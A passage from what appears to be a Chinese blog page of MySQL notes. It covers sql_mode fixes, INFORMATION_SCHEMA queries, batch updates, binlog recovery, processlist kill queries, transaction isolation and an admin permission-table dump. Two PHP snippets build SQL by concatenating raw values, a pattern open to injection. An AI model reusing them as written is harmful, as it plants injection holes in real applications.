class="comment">        **/</span></span><br><span class="line">        $sql=<span class="string">"select id, num, money from ims_hotmallstore_goods where id="</span>.$goods_id;</span><br><span class="line">&#125;</span><br><span class="line">补充第二个问题，看下来是不会的，但是会出现数据的错误，最直接的就是你能看到的超库存。</span><br><span class="line"></span><br><span class="line">当然，这个还有一些隐藏的问题。因为并发，数据库压力比较大，如果实时去 update 和 insert 的话，会出现一些单点故障，比如数据库奔溃。</span><br><span class="line"></span><br><span class="line">我一般入库的做法是在热度过后再批量入库。</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/34293</span></span><br></pre></td></tr></table></figure>
<h3 id="mysql5-7-datetime-默认值为‘0000-00-00-00-00-00’值无法创建"><a href="#mysql5-7-datetime-默认值为‘0000-00-00-00-00-00’值无法创建" class="headerlink" title="mysql5.7 datetime 默认值为‘0000-00-00 00:00:00’值无法创建"></a>mysql5.7 datetime 默认值为‘0000-00-00 00:00:00’值无法创建</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、使用root登陆数据库 命令界面执行</span><br><span class="line">select @@sql_mode;</span><br><span class="line"> 结果中包含下面两个</span><br><span class="line">NO_ZERO_IN_DATE,NO_ZERO_DATE</span><br><span class="line"><span class="number">2</span>、修改/etc/my.cnf，查找sql_model如果找不到则添加如下代码 </span><br><span class="line">sql_mode=<span class="string">"ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"</span></span><br><span class="line"><span class="number">3</span>、重启mysql</span><br><span class="line">/etc/ini.d/mysql restart</span><br><span class="line">简单几步大功告成！</span><br><span class="line"> </span><br><span class="line">原因：</span><br><span class="line">NO_ZERO_IN_DATE,NO_ZERO_DATE是无法默认为‘<span class="number">0000</span><span class="number">-00</span><span class="number">-00</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>’的根源。</span><br><span class="line">NO_ZERO_IN_DATE：在严格模式下，不允许日期和月份为零 </span><br><span class="line">NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。</span><br></pre></td></tr></table></figure>
<h3 id="INFORMATION-SCHEMA"><a href="#INFORMATION-SCHEMA" class="headerlink" title="INFORMATION_SCHEMA"></a>INFORMATION_SCHEMA</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">INFORMATION_SCHEMA 是用来访问数据库的元数据（比如数据库，表的名称，列的数据类型或者访问权限等）的，在每个 MySQL 的实例中，INFORMATION_SCHEMA 保存了它维护的所有数据库的信息</span><br><span class="line">查询出数据库 wizard 中所有的表以及数据类型，存储引擎。</span><br><span class="line">使用 INFORMATION_SCHEMA 查询可能会从多个数据库检索信息，所以查询可能会比较耗时，对性能产生一定的影响。在执行之前，可以使用 EXPLAIN 命令检查一下查询的效率</span><br><span class="line">mysql&gt; SELECT table_name, table_type, engine</span><br><span class="line">    -&gt; FROM information_schema.tables</span><br><span class="line">    -&gt; WHERE table_schema = <span class="string">'wizard'</span></span><br><span class="line">    -&gt; ORDER BY table_name;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//github.com/mylxsw/growing-up/blob/master/doc/mysql-lock-transaction.md  程序猿成长计划</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/35773</span></span><br></pre></td></tr></table></figure>
<h3 id="Got-error-134-from-storage-engine"><a href="#Got-error-134-from-storage-engine" class="headerlink" title="Got error 134 from storage engine"></a>Got error 134 from storage engine</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> SELECT * FROM <span class="string">`xx_article`</span> WHERE <span class="string">`cid1`</span>  =<span class="number">6</span> LIMIT <span class="number">0</span>  ,  <span class="number">30</span></span><br><span class="line"></span><br><span class="line">. #1030 - Got error 134 from storage engine</span><br><span class="line">　　这才发现原来是存储引擎发生了错误，知道了原因就来弱弱的修复下：</span><br><span class="line"></span><br><span class="line">　　先 check 表:</span><br><span class="line"></span><br><span class="line">check table <span class="string">`xx_article`</span>;</span><br><span class="line">　　这里需要注意的一点是，check 完表后必须修复之后 才能看到数据，切莫看到数据记录为空，就大惊失色。</span><br><span class="line"></span><br><span class="line">　　然后再修复表：</span><br><span class="line"></span><br><span class="line"> repair  table <span class="string">`xx_article`</span>;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35836</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL批量更新与插入"><a href="#MySQL批量更新与插入" class="headerlink" title="MySQL批量更新与插入"></a>MySQL批量更新与插入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">replace into table （ <span class="string">`column1`</span>,<span class="string">`column2`</span>,<span class="string">`column3`</span> ）values (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>),(<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">INSERT INTO t1 (a,b,c) VALUES (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">  ON DUPLICATE KEY UPDATE c=c+<span class="number">1</span>;</span><br><span class="line">UPDATE t1 SET c=c+<span class="number">1</span> WHERE a=<span class="number">1</span>;</span><br><span class="line">update table set </span><br><span class="line">column1 = <span class="keyword">case</span>  when column2 = <span class="number">1</span> then <span class="number">2</span> <span class="keyword">else</span> <span class="number">3</span> end ,</span><br><span class="line">column3 = <span class="keyword">case</span>  when column4 = <span class="number">1</span> then <span class="number">2</span> <span class="keyword">else</span> <span class="number">3</span> end </span><br><span class="line">where id <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">//拼装按条件批量更新SQL语句</span></span><br><span class="line">protected <span class="function"><span class="keyword">function</span> <span class="title">handleUpdate</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (empty($data) || !is_array($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $keys_array = array_keys(current($data));</span><br><span class="line"></span><br><span class="line"><span class="comment">//需要被更新的字段</span></span><br><span class="line">        $update_column = [</span><br><span class="line">            $keys_array[<span class="number">5</span>],</span><br><span class="line">            $keys_array[<span class="number">6</span>],</span><br><span class="line">            $keys_array[<span class="number">8</span>],</span><br><span class="line">            $keys_array[<span class="number">9</span>],</span><br><span class="line">            $keys_array[<span class="number">16</span>],</span><br><span class="line">            $keys_array[<span class="number">14</span>]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line"><span class="comment">//更新条件</span></span><br><span class="line">        $vehicle_id = $keys_array[<span class="number">2</span>];</span><br><span class="line">        $body_color = $keys_array[<span class="number">3</span>];</span><br><span class="line">        $interior_color = $keys_array[<span class="number">4</span>];</span><br><span class="line">        $city_id = $keys_array[<span class="number">11</span>];</span><br><span class="line">        $province_id = $keys_array[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">        $q = <span class="string">"UPDATE ce SET "</span>;</span><br><span class="line">        foreach ($update_column <span class="keyword">as</span> $update_colum) &#123;</span><br><span class="line">            $q .= <span class="string">' '</span> . $update_colum . <span class="string">' = CASE '</span>;</span><br><span class="line">            foreach ($data <span class="keyword">as</span> $value) &#123;</span><br><span class="line">                $value[$update_colum] = !isset($value[$update_colum]) || empty($value[$update_colum])</span><br><span class="line">                    ? <span class="number">0</span> : $value[$update_colum];</span><br><span class="line">                $q .= <span class="string">' when '</span> . $vehicle_id . <span class="string">' ='</span> . $value[$vehicle_id]</span><br><span class="line">                    . <span class="string">' and '</span> . $body_color . <span class="string">' = "'</span> . $value[$body_color] . <span class="string">'"'</span></span><br><span class="line">                    . <span class="string">' and '</span> . $interior_color . <span class="string">' = "'</span> . $value[$interior_color] . <span class="string">'"'</span></span><br><span class="line">                    . <span class="string">' and '</span> . $city_id . <span class="string">' ='</span> . $value[$city_id]</span><br><span class="line">                    . <span class="string">' and '</span> . $province_id . <span class="string">' ='</span> . $value[$province_id] . <span class="string">' then '</span> . $value[$update_colum];</span><br><span class="line">            &#125;</span><br><span class="line">            $q .= <span class="string">" ELSE "</span> . $update_colum . <span class="string">" END, "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $q = rtrim($q, <span class="string">", "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">https:<span class="comment">//dalebao.github.io/2019/04/27/MySQL%E6%89%B9%E9%87%8F%E6%9B%B4%E6%96%B0%E4%B8%8E%E6%8F%92%E5%85%A5/</span></span><br></pre></td></tr></table></figure>
<h3 id="恢复误删的数据库"><a href="#恢复误删的数据库" class="headerlink" title="恢复误删的数据库"></a>恢复误删的数据库</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql -h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> -uroot -p del &lt; bak.sql</span><br><span class="line">误删后可以保存下binlog</span><br><span class="line"></span><br><span class="line">mysqlbinlog mysql-bin<span class="number">.000011</span> &gt; del.log</span><br><span class="line">打开文件，去掉drop操作并保存。</span><br><span class="line"></span><br><span class="line">mysql -h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> -uroot -p &lt;del.log</span><br><span class="line">当然，比较建议通过dump全备份操作，然后找出备份到drop的pos。</span><br></pre></td></tr></table></figure>
<h3 id="show-processlist-神器"><a href="#show-processlist-神器" class="headerlink" title="show processlist 神器"></a>show processlist 神器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SELECT id, db, USER, HOST, command, time, state, info FROM information_schema. PROCESSLIST WHERE command != <span class="string">'Sleep'</span> ORDER BY time DESC;</span><br><span class="line">mysql&gt; show full processlist;</span><br><span class="line">+--------+------+----------------------+-------+---------+------+----------+-----------------------+</span><br><span class="line">| Id     | User | Host                 | db    | Command | Time | State    | Info                  |</span><br><span class="line">+--------+------+----------------------+-------+---------+------+----------+-----------------------+</span><br><span class="line">| <span class="number">449000</span> | root | <span class="number">127.123</span><span class="number">.213</span><span class="number">.11</span>:<span class="number">59828</span> | stark | Sleep   | <span class="number">1270</span> |          | NULL                  |</span><br><span class="line"></span><br><span class="line">-- 查询执行时间超过<span class="number">3</span>分钟的线程，然后拼接成 kill 语句</span><br><span class="line">select concat(<span class="string">'kill '</span>, id, <span class="string">';'</span>)</span><br><span class="line"><span class="keyword">from</span> information_schema.processlist</span><br><span class="line">where command != <span class="string">'Sleep'</span></span><br><span class="line">and time &gt; <span class="number">3</span>*<span class="number">60</span></span><br><span class="line">order by time desc;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/36035</span></span><br></pre></td></tr></table></figure>
<h3 id="like-条件的优化"><a href="#like-条件的优化" class="headerlink" title="like 条件的优化"></a>like 条件的优化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">like 语句查询慢的可以尝试使用函数来查询，具体为 instr (字段名，<span class="string">' 值 '</span>)&gt;<span class="number">0</span></span><br><span class="line">比如查询包含 “钟” 字的，instr (name, <span class="string">' 钟 '</span>) &gt; <span class="number">0</span></span><br><span class="line">使用该函数后，查询仅需 <span class="number">0.031</span>s</span><br><span class="line">https:<span class="comment">//learnku.com/articles/36187</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL事务隔离"><a href="#MySQL事务隔离" class="headerlink" title="MySQL事务隔离"></a>MySQL事务隔离</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">事务就是一组原子性的sql查询，或者说是一个独立的工作单元。简而言之，事务内的语句要么全部执行成功，要么全部执行失败。</span><br><span class="line"></span><br><span class="line">在Mysql中，事务支持是在引擎层实现的，但并不是所有的Mysql引擎都支持事务，比如MyISAM引擎就不支持事务，这也是MyISAM被InnoDB取代的重要原因之一。</span><br><span class="line"></span><br><span class="line">提到事务，我们肯定会想到ACID：</span><br><span class="line"></span><br><span class="line">原子性(Atomicity)</span><br><span class="line">一致性(Consistency)</span><br><span class="line">隔离性(Isolation)</span><br><span class="line">持久性(Durability)</span><br><span class="line">隔离级别</span><br><span class="line">当数据库中有多个事务同时执行时，就可能会出现脏读、不可重复读、幻读等问题，因为就有了事务隔离级别的概念。</span><br><span class="line"></span><br><span class="line">SQL标准正定义了四种隔离级别：</span><br><span class="line"></span><br><span class="line">READ UNCOMMITTED (未提交读)</span><br><span class="line"></span><br><span class="line">事务中的修改，即使还没有提交，对其他事务都是可见的。事务可以读取未提交的数据，也被称为脏读(Dirty Read)。</span><br><span class="line"></span><br><span class="line">READ COMMITTED(提交读)</span><br><span class="line"></span><br><span class="line">一个事务提交后，所做的变更才能被其他事务看到。这个级别也叫不可重复读，因为事务中执行<span class="number">2</span>次相同的查询，可能得到的结果是不一样的。</span><br><span class="line"></span><br><span class="line">REPEATABLE READ(可重复读)</span><br><span class="line"></span><br><span class="line">一个事务执行的过程中，总是和这个事务在启动时看到的数据是一致的。当然在这个级别下，未提交的数据变更对其他事务也是不可见的。</span><br><span class="line"></span><br><span class="line">SERIALIZABLE(可串行化)</span><br><span class="line"></span><br><span class="line">对同一行记录，写和读都会加锁，当出现读写锁冲突时，后访问的事务必须等前一个事务执行完成才能继续执行，就会导致大量的超时和锁争用的问题。</span><br><span class="line"></span><br><span class="line">在实现上，数据库里面会创建一个视图，访问的时候以视图的逻辑为准。</span><br><span class="line"></span><br><span class="line">在可重复读这个隔离级别下，这个视图是事务开启的时候创建的，整个事务期间都用这个视图。</span><br><span class="line"></span><br><span class="line">在读提交的隔离级别下，这个视图是在sql语句开始执行的时候创建的。</span><br><span class="line"></span><br><span class="line">在读未提交的隔离级别下，直接返回记录上的最新值，没有视图概念。</span><br><span class="line"></span><br><span class="line">在串行化的隔离级别下，直接用加锁的方式避免并行访问。</span><br><span class="line"></span><br><span class="line">配置的方式是将启动参数transaction-isolation设置成想要的隔离级别。</span><br><span class="line"></span><br><span class="line">查看当前设置：</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">'transaction_isolation'</span>;</span><br><span class="line">+-----------------------+-----------------+</span><br><span class="line">| Variable_name         | Value           |</span><br><span class="line">+-----------------------+-----------------+</span><br><span class="line">| transaction_isolation | REPEATABLE-READ |</span><br><span class="line">+-----------------------+-----------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">总之，存在即合理，不同的隔离级别适用于不同的场景，具体我们应该根据业务场景来决定。</span><br><span class="line"></span><br><span class="line">事务隔离的实现</span><br><span class="line">在Mysql中，实际上每条记录的更新同时也会记录一条回滚操作，记录上的最新值通过回滚操作，都可以得到前一个状态的值。</span><br><span class="line"></span><br><span class="line">系统会自动判断，当没有事务再需要回滚日志时，会删除回滚日志。</span><br><span class="line"></span><br><span class="line">为什么不建议使用长事务：</span><br><span class="line"></span><br><span class="line">长事务意味着系统里面会存在很老的事务视图，由于这些事务随时可以访问数据库里面的任何数据，所以这个事务提交之前，数据库里可能用到的回滚记录必须保留着，这就会占用大量的存储空间。同时长事务还占用锁资源，也可能拖垮整个库。</span><br><span class="line"></span><br><span class="line">事务启动的方式</span><br><span class="line">显式启动事务语句，begin或者start transaction,提交就是commit,回滚用rollback。</span><br><span class="line">set autocommit = <span class="number">0</span>,这个命令会将线程的自动提交关掉，意味着如果执行一个select 语句，这个事务就启动了，并且不会自动提交，直到你主动执行commit或者rollback，或者断开连接。</span><br><span class="line">个人建议还是通过第一种方式显式启动事务，避免长事务的发生。</span><br><span class="line"></span><br><span class="line">在 set autocommit = <span class="number">1</span> 的情况下，用 begin 显式启动的事务，如果执行 commit 则提交事务。如果执行 commit work and chain，则是提交事务并自动启动下一个事务，这样也省去了再次执行 begin 语句的开销。</span><br><span class="line"></span><br><span class="line">查询长事务：</span><br><span class="line"></span><br><span class="line">下面语句是查询持续时间超过<span class="number">60</span>s的事务</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> information_schema.innodb_trx where TIME_TO_SEC(timediff(now(),trx_started))&gt;<span class="number">60</span>;</span><br><span class="line">Empty set (<span class="number">0.00</span> sec)</span><br><span class="line">总结下来，我们在开发过程中，尽量少用长事务，如果无法避免，保证逻辑日志空间足够大，并且支持动态日志空间增长。监控Innodb_trx表，发现长事务报警</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> https:<span class="comment">//tsmliyun.github.io/mysql/MySQL%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB/</span></span><br></pre></td></tr></table></figure>
<h3 id="后台权限表"><a href="#后台权限表" class="headerlink" title="后台权限表"></a>后台权限表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS <span class="string">`crm_admin_permission`</span>;</span><br><span class="line"></span><br><span class="line">CREATE TABLE <span class="string">`crm_admin_permission`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">10</span>) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`parent_id`</span> int(<span class="number">11</span>) NOT NULL DEFAULT <span class="number">0</span>,</span><br><span class="line">  <span class="string">`title`</span> varchar(<span class="number">50</span>) NOT NULL DEFAULT <span class="string">''</span> COMMENT <span class="string">'标题'</span>,</span><br><span class="line">  <span class="string">`icon`</span> varchar(<span class="number">50</span>) NOT NULL DEFAULT <span class="string">''</span>,</span><br><span class="line">  <span class="string">`path`</span> varchar(<span class="number">50</span>) NOT NULL DEFAULT <span class="string">''</span> COMMENT <span class="string">'路由'</span>,</span><br><span class="line">  <span class="string">`is_menu`</span> tinyint(<span class="number">4</span>) NOT NULL DEFAULT <span class="number">0</span> COMMENT <span class="string">'是否是菜单,1=&gt;是,0=&gt;否'</span>,</span><br><span class="line">  <span class="string">`sort`</span> int(<span class="number">11</span>) NOT NULL DEFAULT <span class="number">0</span> COMMENT <span class="string">'排序'</span>,</span><br><span class="line">  <span class="string">`level`</span> tinyint(<span class="number">4</span>) NOT NULL DEFAULT <span class="number">0</span> COMMENT <span class="string">'等级'</span>,</span><br><span class="line">  <span class="string">`status`</span> tinyint(<span class="number">4</span>) NOT NULL DEFAULT <span class="number">1</span> COMMENT <span class="string">'状态 1=&gt;启用 0=&gt;禁用'</span>,</span><br><span class="line">  <span class="string">`created_at`</span> timestamp NOT NULL DEFAULT <span class="string">'0000-00-00 00:00:00'</span>,</span><br><span class="line">  <span class="string">`updated_at`</span> timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">  KEY <span class="string">`idx_parent_id`</span> (<span class="string">`parent_id`</span>),</span><br><span class="line">  KEY <span class="string">`idx_path`</span> (<span class="string">`path`</span>)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=<span class="string">'菜单表'</span>;</span><br><span class="line"></span><br><span class="line">LOCK TABLES <span class="string">`crm_admin_permission`</span> WRITE;</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `crm_admin_permission` DISABLE KEYS */</span>;</span><br><span class="line"></span><br><span class="line">INSERT INTO <span class="string">`crm_admin_permission`</span> (<span class="string">`id`</span>, <span class="string">`parent_id`</span>, <span class="string">`title`</span>, <span class="string">`icon`</span>, <span class="string">`path`</span>, <span class="string">`is_menu`</span>, <span class="string">`sort`</span>, <span class="string">`level`</span>, <span class="string">`status`</span>, <span class="string">`created_at`</span>, <span class="string">`updated_at`</span>)</span><br><span class="line">VALUES</span><br><span class="line">	(<span class="number">23</span>,<span class="number">0</span>,<span class="string">'管理员管理'</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:37:40'</span>,<span class="string">'2019-05-20 18:37:40'</span>),</span><br><span class="line">	(<span class="number">24</span>,<span class="number">23</span>,<span class="string">'管理员列表'</span>,<span class="string">''</span>,<span class="string">'admin/admin/lists'</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:38:31'</span>,<span class="string">'2019-05-20 18:38:31'</span>),</span><br><span class="line">	(<span class="number">25</span>,<span class="number">23</span>,<span class="string">'角色管理'</span>,<span class="string">''</span>,<span class="string">'admin/role/lists'</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:38:59'</span>,<span class="string">'2019-05-20 18:38:59'</span>),</span><br><span class="line">	(<span class="number">26</span>,<span class="number">23</span>,<span class="string">'权限管理'</span>,<span class="string">''</span>,<span class="string">'admin/permission/lists'</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:39:36'</span>,<span class="string">'2019-05-20 18:39:36'</span>),</span><br><span class="line">	(<span class="number">27</span>,<span class="number">24</span>,<span class="string">'添加管理员'</span>,<span class="string">''</span>,<span class="string">'admin/admin/create'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="string">'2019-05-20 18:41:44'</span>,<span class="string">'2019-05-20 18:41:44'</span>),</span><br><span class="line">	(<span class="number">28</span>,<span class="number">24</span>,<span 